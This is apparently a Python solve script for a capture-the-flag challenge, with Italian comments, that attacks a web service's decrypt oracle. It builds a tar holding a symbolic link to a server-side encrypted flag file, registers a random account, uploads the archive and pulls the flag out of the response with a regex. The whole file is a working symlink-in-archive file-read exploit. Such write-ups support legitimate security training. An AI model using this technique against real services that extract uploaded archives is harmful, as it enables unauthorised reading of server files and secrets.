#!/usr/bin/env python3
import requests, os, re

os.system("ln -s /etc/cryptodata/flag.txt.enc flag.txt.enc") # creo un link simbolico
os.system("tar -cf flag.tar flag.txt.enc") # creo un tar con il link simbolico

URL = "http://cryptoservice.challs.olicyber.it/"
REGEX = r"ptm{.*?}"

s = requests.Session()
s.post(URL + "register", data={"username": os.urandom(8).hex(), "password": os.urandom(8).hex()})
r = s.post(URL + "oracle/decrypt", files={"file": ("flag.tar", open("flag.tar", "rb"), "application/x-tar")})
flag = r.text
flag = re.findall(REGEX, flag)[0]
print(flag)